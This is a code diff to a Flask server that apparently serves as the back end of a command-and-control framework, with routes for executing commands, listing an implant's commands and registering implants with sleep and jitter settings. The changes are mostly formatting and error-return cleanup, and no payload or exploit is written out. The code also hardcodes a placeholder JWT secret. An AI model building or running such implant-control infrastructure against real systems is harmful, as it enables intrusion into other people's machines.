@@ -29,6 +29,7 @@ app.config["JWT_SECRET_KEY"] = "change-me"
 app.config['CORS_HEADERS'] = 'Content-Type'
 jwt = JWTManager(app)
 
+
 @app.route('/logout', methods=["POST"])
 def logout():
     try:
@@ -99,13 +100,7 @@ def handle_execute():
         return response
     except Exception as error:
         print(f"Failure sending commands: {error}")
-        response = app.response_class(
-            response=f"Failure! {error}",
-            status=400,
-            mimetype="application/json"
-        )
-        response.headers['Acess-Control-Allow-Origin'] = config.clientURL
-        return response
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
 
@@ -121,9 +116,11 @@ def get_commands(id):
     except Exception as error:
         print("failed to retrieve data on get_commands")
         print(error)
-        return error, {'Access-Control-Allow-Origin': config.clientURL} 
+        return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Register an implant, on the implant side
+
+
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -135,7 +132,8 @@ def register_implant():
         sleep = data['sleep']
         first_connection = last_seen = datetime.now().isoformat()
         active = True
-        columns = ["first_connection", "active", "jitter", "sleep", "last_seen"]
+        columns = ["first_connection", "active",
+                   "jitter", "sleep", "last_seen"]
         values = [first_connection, active, jitter, sleep, last_seen]
         print("Executing Query")
         query = tools.insertQueryBuilder("implants", columns, ["implant_id"])
@@ -146,7 +144,9 @@ def register_implant():
         print(f"ERROR: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
-#Display implants 
+# Display implants
+
+
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
